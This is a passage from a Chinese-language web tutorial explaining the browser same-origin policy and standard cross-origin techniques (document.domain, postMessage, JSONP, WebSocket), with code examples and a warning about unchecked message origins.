<li>window.postMessage()</li></ul> <p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。而且，即使是<code>location</code>对象，非同源的情况下，也只允许调用<code>location.replace()</code>方法和写入<code>location.href</code>属性。</p> <p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p> <h3 id="cookie-2"><a href="#cookie-2" class="header-anchor">#</a> Cookie</h3> <p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p> <p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p> <div class="language- extra-class"><pre class="language-text"><code>// 两个网页都需要设置
+document.domain = 'example.com';
+</code></pre></div><p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p> <p>现在，A 网页通过脚本设置一个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = &quot;test1=hello&quot;;
+</code></pre></div><p>B 网页就可以读到这个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>var allCookie = document.cookie;
+</code></pre></div><p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p> <p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>example.com</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key=value; domain=example.com; path=/
+</code></pre></div><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p> <h3 id="iframe-和多窗口通信"><a href="#iframe-和多窗口通信" class="header-anchor">#</a> iframe 和多窗口通信</h3> <p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p> <p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p> <div class="language- extra-class"><pre class="language-text"><code>document
+.getElementById(&quot;myIFrame&quot;)
+.contentWindow
+.document
+// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
+</code></pre></div><p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p> <p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p> <div class="language- extra-class"><pre class="language-text"><code>window.parent.document.body
+// 报错
+</code></pre></div><p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p> <p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p> <p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。</p> <blockquote><ul><li>片段识别符（fragment identifier）</li> <li>跨文档通信API（Cross-document messaging）</li></ul></blockquote> <h4 id="片段识别符"><a href="#片段识别符" class="header-anchor">#</a> 片段识别符</h4> <p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p> <p>父窗口可以把信息，写入子窗口的片段标识符。</p> <div class="language- extra-class"><pre class="language-text"><code>var src = originURL + '#' + data;
+document.getElementById('myIFrame').src = src;
+</code></pre></div><p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p> <p>子窗口通过监听<code>hashchange</code>事件得到通知。</p> <div class="language- extra-class"><pre class="language-text"><code>window.onhashchange = checkMessage;
+
+function checkMessage() {
+  var message = window.location.hash;
+  // ...
+}
+</code></pre></div><p>同样的，子窗口也可以改变父窗口的片段标识符。</p> <div class="language- extra-class"><pre class="language-text"><code>parent.location.href = target + '#' + hash;
+</code></pre></div><h4 id="window-postmessage"><a href="#window-postmessage" class="header-anchor">#</a> window.postMessage()</h4> <p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p> <p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p> <div class="language- extra-class"><pre class="language-text"><code>// 父窗口打开一个子窗口
+var popup = window.open('http://bbb.com', 'title');
+// 父窗口向子窗口发消息
+popup.postMessage('Hello World!', 'http://bbb.com');
+</code></pre></div><p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p> <p>子窗口向父窗口发送消息的写法类似。</p> <div class="language- extra-class"><pre class="language-text"><code>// 子窗口向父窗口发消息
+window.opener.postMessage('Nice to see you', 'http://aaa.com');
+</code></pre></div><p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p> <div class="language- extra-class"><pre class="language-text"><code>// 父窗口和子窗口都可以用下面的代码，
+// 监听 message 消息
+window.addEventListener('message', function (e) {
+  console.log(e.data);
+},false);
+</code></pre></div><p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p> <blockquote><ul><li><code>event.source</code>：发送消息的窗口</li> <li><code>event.origin</code>: 消息发向的网址</li> <li><code>event.data</code>: 消息内容</li></ul></blockquote> <p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p> <div class="language- extra-class"><pre class="language-text"><code>window.addEventListener('message', receiveMessage);
+function receiveMessage(event) {
+  event.source.postMessage('Nice to see you!', '*');
+}
+</code></pre></div><p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p> <p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p> <div class="language- extra-class"><pre class="language-text"><code>window.addEventListener('message', receiveMessage);
+function receiveMessage(event) {
+  if (event.origin !== 'http://aaa.com') return;
+  if (event.data === 'Hello World') {
+    event.source.postMessage('Hello', event.origin);
+  } else {
+    console.log(event.data);
+  }
+}
+</code></pre></div><h4 id="localstorage"><a href="#localstorage" class="header-anchor">#</a> LocalStorage</h4> <p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p> <p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>window.onmessage = function(e) {
+  if (e.origin !== 'http://bbb.com') {
+    return;
+  }
+  var payload = JSON.parse(e.data);
+  localStorage.setItem(payload.key, JSON.stringify(payload.data));
+};
+</code></pre></div><p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p> <p>父窗口发送消息的代码如下。</p> <div class="language- extra-class"><pre class="language-text"><code>var win = document.getElementsByTagName('iframe')[0].contentWindow;
+var obj = { name: 'Jack' };
+win.postMessage(
+  JSON.stringify({key: 'storage', data: obj}),
+  'http://bbb.com'
+);
+</code></pre></div><p>加强版的子窗口接收消息的代码如下。</p> <div class="language- extra-class"><pre class="language-text"><code>window.onmessage = function(e) {
+  if (e.origin !== 'http://bbb.com') return;
+  var payload = JSON.parse(e.data);
+  switch (payload.method) {
+    case 'set':
+      localStorage.setItem(payload.key, JSON.stringify(payload.data));
+      break;
+    case 'get':
+      var parent = window.parent;
+      var data = localStorage.getItem(payload.key);
+      parent.postMessage(data, 'http://aaa.com');
+      break;
+    case 'remove':
+      localStorage.removeItem(payload.key);
+      break;
+  }
+};
+</code></pre></div><p>加强版的父窗口发送消息代码如下。</p> <div class="language- extra-class"><pre class="language-text"><code>var win = document.getElementsByTagName('iframe')[0].contentWindow;
+var obj = { name: 'Jack' };
+// 存入对象
+win.postMessage(
+  JSON.stringify({key: 'storage', method: 'set', data: obj}),
+  'http://bbb.com'
+);
+// 读取对象
+win.postMessage(
+  JSON.stringify({key: 'storage', method: &quot;get&quot;}),
+  &quot;*&quot;
+);
+window.onmessage = function(e) {
+  if (e.origin != 'http://aaa.com') return;
+  console.log(JSON.parse(e.data).name);
+};
+</code></pre></div><h3 id="ajax"><a href="#ajax" class="header-anchor">#</a> AJAX</h3> <p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p> <p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p> <blockquote><ul><li>JSONP</li> <li>WebSocket</li> <li>CORS</li></ul></blockquote> <h4 id="jsonp"><a href="#jsonp" class="header-anchor">#</a> JSONP</h4> <p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。</p> <p>它的做法如下。</p> <p>第一步，网页添加一个<code>&lt;script&gt;</code>元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;script src=&quot;http://api.foo.com?callback=bar&quot;&gt;&lt;/script&gt;
+</code></pre></div><p>注意，请求的脚本网址有一个<code>callback</code>参数（<code>?callback=bar</code>），用来告诉服务器，客户端的回调函数名称（<code>bar</code>）。</p> <p>第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（<code>bar({...})</code>）。</p> <p>第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是<code>&lt;script&gt;</code>标签请求的脚本内容。这时，客户端只要定义了<code>bar()</code>函数，就能在该函数体内，拿到服务器返回的 JSON 数据。</p> <p>下面看一个实例。首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨域网址发出请求。</p> <div class="language- extra-class"><pre class="language-text"><code>function addScriptTag(src) {
+  var script = document.createElement('script');
+  script.setAttribute('type', 'text/javascript');
+  script.src = src;
+  document.body.appendChild(script);
+}
+
+window.onload = function () {
+  addScriptTag('http://example.com/ip?callback=foo');
+}
+
+function foo(data) {
+  console.log('Your public IP address is: ' + data.ip);
+};
+</code></pre></div><p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p> <p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p> <div class="language- extra-class"><pre class="language-text"><code>foo({
+  'ip': '8.8.8.8'
+});
+</code></pre></div><p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p> <h4 id="websocket"><a href="#websocket" class="header-anchor">#</a> WebSocket</h4> <p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p> <p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自<a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener noreferrer">维基百科<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>）。</p> <div class="language- extra-class"><pre class="language-text"><code>GET /chat HTTP/1.1
+Host: server.example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+Sec-WebSocket-Protocol: chat, superchat
+Sec-WebSocket-Version: 13
+Origin: http://example.com
+</code></pre></div><p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p> <p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p> <div class="language- extra-class"><pre class="language-text"><code>HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
+Sec-WebSocket-Protocol: chat
+</code></pre></div></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6620245489"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/01/15, 11:11:38</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/229568/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">浏览器模型(一)</div></a> <a href="/pages/b7cf03/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">浏览器模型(三)</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/pages/229568/" class="prev">浏览器模型(一)</a></span> <span class="next"><a href="/pages/b7cf03/">浏览器模型(三)</a>→
+      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/610238/"><div>浏览器模型(四)</div></a> <span>12-12</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/229568/"><div>浏览器模型(一)</div></a> <span>12-11</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/b7cf03/"><div>浏览器模型(三)</div></a> <span>12-07</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:1390128154@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/wuKongNotNull" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://music.163.com/#/playlist?id=755597173" title="听音乐" target="_blank" class="iconfont icon-erji"></a></div> 
+  Theme by
+  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
+    | Copyright © 2020-2022
+    <span>悟空非空也 | <a href="https://github.com/WuKongNotNull/wukong-post/blob/main/LICENSE" target="_blank">Apache License 2.0</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
+          跟随系统
+        </li><li class="iconfont icon-rijianmoshi">
+          浅色模式
+        </li><li class="iconfont icon-yejianmoshi">
+          深色模式
+        </li><li class="iconfont icon-yuedu">
+          阅读模式
+        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
+      <ins class="adsbygoogle"
+          style="display:inline-block;max-width:160px;max-height:160px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="8377369658"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+      </div></div></div></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.0772105c.js" defer></script><script src="/assets/js/2.6497fd29.js" defer></script><script src="/assets/js/219.b04f0864.js" defer></script>
+  </body>
+</html>
